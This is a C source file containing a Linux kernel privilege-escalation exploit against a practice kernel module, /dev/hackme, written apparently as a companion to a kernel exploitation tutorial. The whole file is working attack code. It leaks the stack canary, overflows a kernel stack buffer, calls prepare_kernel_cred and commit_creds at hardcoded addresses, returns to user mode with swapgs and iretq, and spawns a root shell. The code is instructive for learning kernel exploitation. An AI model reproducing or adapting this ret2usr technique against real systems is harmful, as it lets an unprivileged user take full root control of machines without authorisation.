/*

Exploit Title: sploit1.c
Author: wetw0rk
Link: https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/

Description: Simple Kernel Exploit where we return to userland after gaining root
             privileges.

*/

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

#define TARGET_MODULE "/dev/hackme"

int global_fd;

void open_dev()
{
  global_fd = open(TARGET_MODULE, O_RDWR);
  if (global_fd < 0) {
    puts("[-] Failed to open device");
    exit(-1);
  } else {
    printf("[*] Successfully opened device %s\n", TARGET_MODULE);
  }
}

unsigned long cookie;

/*
 * void leak(void):
 *   The local_a0 buffer can only hold 128 bytes and since the cookie lays
 *   right after it, the cookie will at offset 16 (128/(8 == sizeof(unsigned long int == 16))
 *
 * */
void leak(void) {
  unsigned long int leak[20];

  ssize_t r = read(global_fd,     // File descriptor to read from
		   leak,          // buffer to recieve data
		   sizeof(leak)); // 160 bytes

  cookie = leak[16]; // Cookie / Canary

  printf("[*] Successfully leaked %zd bytes\n", r);
  printf("[+] Cookie: 0x%lx\n", cookie);
}

void get_shell(void) {
  puts("[+] Round trip complete kernel-land => user-land");
  if (getuid() == 0) {
    printf("[*] UID: %d, got root!\n", getuid());
    system("/bin/sh");
  } else {
    puts("[*] Exploitation failed");
  }
}

/*
 * void escalate_privs(void):
 *   This function changes our userid from a low privileged user to 0 aka
 *   root. It will also return us from kernel-land to user-land.
 *
 * */
unsigned long int user_rip = (unsigned long) get_shell;

void escalate_privs(void) {
  // Arguments 1-6 are passed via registers RDI, RSI, RDX, RCX, R8, R9 respectively
  // Arguments 7+ are pushed onto the stack 
  __asm__(
  ".intel_syntax noprefix;"
  "movabs rax, 0xffffffff814c67f0;" // prepare_kernel_cred
  "xor rdi, rdi;"                   // argv1 = 0
  "call rax;"                       // rax = call prepare_kernel_cred(0)
  "mov rdi, rax;"                   // argv1 = struct cred* 
  "movabs rax, 0xffffffff814c6410;" // commit_creds
  "call rax;"                       // rax = commit_creds(struct cred *new)
  // Return to user-land from kernel-land
  "swapgs;"               // swap the GS register from kernel-mode to user-mode
  "mov r15, user_ss;"     // +------+
  "push r15;"             //        |
  "mov r15, user_sp;"     //        +-- Restore state of CS|RFLAGS|SP|SS and call
  "push r15;"             //        |   get_shell
  "mov r15, user_rflags;" //        |
  "push r15;"             //        |
  "mov r15, user_cs;"     //        |
  "push r15;"             //        |
  "mov r15, user_rip;"    //        |
  "push r15;"             // +------+
  "iretq;"                // return to user-land!
  ".att_syntax;"
  );
}

unsigned long int user_cs, user_ss, user_rflags, user_sp;
/*
 * void save_state(void)
 *   Saving the state of CS|RFLAGS|SP|SS for when returning back into user-land
 *
 * */
void save_state(void) {
  __asm__(
  ".intel_syntax noprefix;"
  "mov user_cs, cs;"  // user_cs = cs
  "mov user_ss, ss;"  // user_ss = ss
  "mov user_sp, rsp;" // user_sp = current location of stack pointer
  "pushf;"            // push flags onto stack
  "pop user_rflags;"  // store RFLAGS into user_rflags
  ".att_syntax;"
  );
  puts("[*] Saved the register state for userland");
}

/*
 * void overflow(void):
 *   Overwrites the return address by overflowing local_a0. 
 *
 * */
void overflow(void) {
  unsigned long int payload[50];
  unsigned offset = 16;

  payload[offset++] = cookie;             // Stack Canary
  payload[offset++] = 0x4242424242424242; // pop rbx
  payload[offset++] = 0x4242424242424242; // pop r12
  payload[offset++] = 0x4242424242424242; // pop rbp
  payload[offset++] = (unsigned long int)escalate_privs; // ret

  puts("[*] Payload generated, triggering overflow");
  ssize_t w = write(global_fd,        // File descriptor to write to
		    payload,          // Data to be written (overwrite return address)
		    sizeof(payload)); // (50 * 8) < 0x1000 but > 128 bytes


  puts("[-] Exploitation failed");
}

int main()
{
  save_state();
  open_dev();
  leak();
  overflow();
  puts("[-] Exploitaiton failed");
}
